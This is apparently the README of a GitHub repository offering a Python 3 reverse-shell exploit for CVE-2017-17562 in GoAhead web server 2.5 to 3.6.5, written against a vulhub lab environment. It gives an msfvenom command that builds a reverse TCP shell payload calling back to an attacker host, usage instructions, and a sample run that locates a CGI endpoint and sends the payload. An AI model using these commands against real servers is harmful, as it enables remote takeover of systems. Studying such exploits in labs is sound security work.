# CVE-2017-17562 RCE GoAhead web server 2.5 < 3.6.5
Standalone Python 3 reverse shell exploit for CVE-2017-17562, works on GoAhead web server versions 2.5 < 3.6.5.

Blog [article here](https://ivanitlearning.wordpress.com/2019/11/02/exploit-rewrite-goahead-web-server-2-5-3-6-5/).

Written and tested on Python 3.7 based on [POC and vulnerable environment here](https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562). Some code borrowed from [the Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/goahead_ldpreload.rb).

Original POC [found here](https://github.com/elttam/advisories/tree/master/CVE-2017-17562). I wrote this because I couldn't get the original POC exploit to work, and only realised that it was missing a function to search for the CGI module to exploit ie. it requires the user to specify its location or provide a wordlist for recursive search.

## Usage
```
root@Kali:~/Infosec/RubyStuff/GoAhead-Web-Server-2.5~3.6.5# ./exploit.py -h
usage: exploit.py [-h] -rhost RHOST [-rport RPORT] [-cgipath CGIPATH] -payload
                  PAYLOAD

Generate the payload first, eg: 
msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp LHOST=192.168.92.134 LPORT=4444 -f elf-so -o dir/payload.so

Required arguments:
  -rhost RHOST      Target host running Go Ahead webserver eg. 192.168.92.153
  -payload PAYLOAD  Path to the malicious elf-so payload. eg dir/payload.so

Optional arguments:
  -rport RPORT      Target port running GoAhead webserver. Default: 8080
  -cgipath CGIPATH  The path to a CGI script on the GoAhead server Default: '/cgi-bin' as in http://192.168.92.153/cgi-bin

Call the exploit like this: 
./exploit.py -rhost 192.168.92.153 -rport 8080 -cgipath /cgi-bin/index -payload dir/payload.so
root@Kali:~/Infosec/RubyStuff/GoAhead-Web-Server-2.5~3.6.5# ./exploit.py -rhost 192.168.92.153 -rport 8080 -payload payload3.so 
Searching 390 paths for an exploitable CGI endpoint...
Exploitable CGI located at /cgi-bin/index
Sending payload...
```
